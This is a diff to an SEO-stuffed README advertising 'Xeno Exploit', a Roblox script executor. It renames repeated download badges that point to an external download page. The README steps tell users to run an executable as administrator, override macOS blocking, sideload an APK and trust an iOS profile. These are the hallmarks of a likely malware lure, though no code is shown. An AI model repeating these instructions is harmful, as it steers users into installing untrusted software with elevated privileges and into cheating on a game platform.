@@ -10,7 +10,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download%20Lua%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
+[![Download](https://img.shields.io/badge/Download%20Xeno%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
 
 </div> 
 
@@ -34,7 +34,7 @@ Many users ask **is xeno exploit safe** – Xeno focuses on stability, frequent 
 - 🤝 **Discord Integration** – Direct links to **roblox xeno executor discord** and **xeno executor discord** channels right inside the app.
 - 📦 **Mobile APK Build** – Official **xeno executor apk** / **xeno executor android** package for supported Android devices.
 
-[![Download](https://img.shields.io/badge/Download%20Lua%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
+[![Download](https://img.shields.io/badge/Download%20Xeno%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
 
 ***
 
@@ -55,7 +55,7 @@ Discussion threads on **xeno exploit reddit** and **xeno executor reddit** often
 
 > “Switched to Xeno after struggling with key systems. The **xeno executor download** took two minutes, setup was simple, and it’s been the most stable **xeno exploit roblox** executor I’ve used so far.” – *UserFromReddit*
 
-[![Download](https://img.shields.io/badge/Download%20Lua%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
+[![Download](https://img.shields.io/badge/Download%20Xeno%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
 
 ***
 
@@ -69,7 +69,7 @@ Discussion threads on **xeno exploit reddit** and **xeno executor reddit** often
 4. Run `XenoExecutor.exe` as administrator.  
 5. Open Roblox, click “Attach” in Xeno, then load and run your scripts.
 
-[![Download](https://img.shields.io/badge/Download%20Lua%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
+[![Download](https://img.shields.io/badge/Download%20Xeno%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
 
 ### macOS
 
@@ -78,7 +78,7 @@ Discussion threads on **xeno exploit reddit** and **xeno executor reddit** often
 3. If macOS blocks the file, allow it in *System Settings → Privacy & Security*.  
 4. Launch Roblox, then start Xeno and attach to the client.  
 
-[![Download](https://img.shields.io/badge/Download%20Lua%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
+[![Download](https://img.shields.io/badge/Download%20Xeno20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
 
 ### Android (Mobile / APK)
 
@@ -87,7 +87,7 @@ Discussion threads on **xeno exploit reddit** and **xeno executor reddit** often
 3. Install the APK and open **xeno executor mobile**.  
 4. Start Roblox on the same device and attach from Xeno’s interface.  
 
-[![Download](https://img.shields.io/badge/Download%20Lua%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
+[![Download](https://img.shields.io/badge/Download%20Xeno%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
 
 ### iOS (Advanced Users)
 
@@ -96,7 +96,7 @@ Discussion threads on **xeno exploit reddit** and **xeno executor reddit** often
 3. Trust the installed profile in *Settings → General → VPN & Device Management*.  
 4. Launch Roblox, then run Xeno to load your scripts.
 
-[![Download](https://img.shields.io/badge/Download%20Lua%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
+[![Download](https://img.shields.io/badge/Download%20Xeno%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
 
 ---
 
@@ -140,7 +140,7 @@ Xeno is built to feel consistent whether you use the main desktop client or **xe
 - Avoid sharing logs, screenshots of internal IDs, or personal data with strangers.  
 - Consider using a VPN if you want an extra layer of network privacy.
 
-[![Download](https://img.shields.io/badge/Download%20Lua%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
+[![Download](https://img.shields.io/badge/Download%20Xeno20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
 
 ---
 
@@ -173,7 +173,7 @@ Xeno is built to feel consistent whether you use the main desktop client or **xe
 
 **Xeno Exploit** provides a no‑key, cross‑platform **xeno exploit roblox** experience focused on speed, stability and ease of use. With desktop clients, **xeno executor mobile** variants for Android and **xeno executor ios**, and an active Discord community, it aims to be the most convenient way to run your favorite scripts.  
 
-[![Download](https://img.shields.io/badge/Download%20Lua%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
+[![Download](https://img.shields.io/badge/Download%20Xeno%20Exploit-brightgreen?style=for-the-badge&logo=github)](https://xeno-exploit-dev.github.io/xeno/)
 
 > 👉 **Download the latest Xeno build, connect to the Discord, and start customizing your Roblox gameplay today.**
 
